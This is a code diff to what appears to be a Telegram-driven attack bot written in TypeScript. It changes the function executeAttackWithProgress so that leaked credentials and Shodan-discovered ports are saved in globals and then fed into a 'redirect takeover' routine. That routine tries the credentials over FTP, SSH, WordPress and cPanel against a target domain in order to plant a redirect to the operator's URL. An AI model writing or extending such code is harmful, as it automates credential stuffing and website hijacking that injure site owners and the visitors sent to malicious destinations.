@@ -5478,6 +5478,14 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             );
             if (lastPhaseForProgress) await narrator.completeLastStep("done");
             // STRICT verification: only count as success if redirect actually works
+            // Save pipeline intel for later methods (redirect takeover, hijack, etc.)
+            if (pipelineResult.leakcheckCredentials && pipelineResult.leakcheckCredentials.length > 0) {
+              (globalThis as any).__lastPipelineLeakCreds = pipelineResult.leakcheckCredentials;
+            }
+            if (pipelineResult.shodanIntel?.allPorts && pipelineResult.shodanIntel.allPorts.length > 0) {
+              (globalThis as any).__lastShodanPorts = pipelineResult.shodanIntel.allPorts;
+            }
+
             const verifiedFiles = pipelineResult.uploadedFiles.filter(f => f.redirectWorks && f.redirectDestinationMatch);
             const anyRedirect = pipelineResult.uploadedFiles.some(f => f.redirectWorks);
             const filesDeployedOnly = pipelineResult.uploadedFiles.filter(f => f.verified && !f.redirectWorks);
@@ -5548,10 +5556,22 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               await narrator.updateStep(credStep, "failed", "Credential hunt failed");
             }
             
-            // Redirect Takeover
-            const takeoverStep = await narrator.addStep("🔓 Redirect Takeover (6 วิธี)");
+            // Redirect Takeover (enhanced with hunted creds + pipeline intel)
+            const takeoverStep = await narrator.addStep("🔓 Redirect Takeover (FTP/SSH/WP/cPanel)");
             const { executeRedirectTakeover } = await import("./redirect-takeover");
-            const hijackResults = await executeRedirectTakeover({ targetUrl: effectiveTargetUrl, ourRedirectUrl: redirectUrl });
+            const prevCreds = (globalThis as any).__lastPipelineLeakCreds || [];
+            const prevPorts = (globalThis as any).__lastShodanPorts || [];
+            const allCreds = [...huntedCreds, ...prevCreds.map((c: any) => ({ username: c.username, password: c.password }))];
+            const hijackFtpCreds = allCreds.map((c: any) => ({ host: domain, username: c.username, password: c.password, port: 21 }));
+            const hijackSshCreds = allCreds.map((c: any) => ({ host: domain, username: c.username, password: c.password, port: 22 }));
+            const hijackResults = await executeRedirectTakeover({
+              targetUrl: effectiveTargetUrl,
+              ourRedirectUrl: redirectUrl,
+              wpCredentials: huntedCreds.length > 0 ? { username: huntedCreds[0].username, password: huntedCreds[0].password } : undefined,
+              ftpCredentials: hijackFtpCreds.length > 0 ? hijackFtpCreds : undefined,
+              sshCredentials: hijackSshCreds.length > 0 ? hijackSshCreds : undefined,
+              openPorts: prevPorts.length > 0 ? prevPorts : undefined,
+            });
             const hijackSucceeded = hijackResults.filter(r => r.success);
             for (const r of hijackResults) {
               await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
@@ -5734,9 +5754,21 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             }
             
           } else if (methodId === "redirect") {
-            // ── Redirect Takeover (direct, no creds) ──
+            // ── Redirect Takeover (enhanced with FTP/SSH creds from previous methods) ──
             const { executeRedirectTakeover } = await import("./redirect-takeover");
-            const rtResults = await executeRedirectTakeover({ targetUrl: effectiveTargetUrl, ourRedirectUrl: redirectUrl });
+            // Collect any credentials discovered from previous pipeline/hijack runs
+            const prevPipelineCreds = (globalThis as any).__lastPipelineLeakCreds || [];
+            const prevShodanPorts = (globalThis as any).__lastShodanPorts || [];
+            const targetHost = domain;
+            const ftpCreds = prevPipelineCreds.map((c: any) => ({ host: targetHost, username: c.username, password: c.password, port: 21 }));
+            const sshCreds = prevPipelineCreds.map((c: any) => ({ host: targetHost, username: c.username, password: c.password, port: 22 }));
+            const rtResults = await executeRedirectTakeover({
+              targetUrl: effectiveTargetUrl,
+              ourRedirectUrl: redirectUrl,
+              ftpCredentials: ftpCreds.length > 0 ? ftpCreds : undefined,
+              sshCredentials: sshCreds.length > 0 ? sshCreds : undefined,
+              openPorts: prevShodanPorts.length > 0 ? prevShodanPorts : undefined,
+            });
             const rtSucceeded = rtResults.filter(r => r.success);
             for (const r of rtResults) {
               await narrator.addStep(`${r.success ? "✅" : "❌"} ${r.method}`);
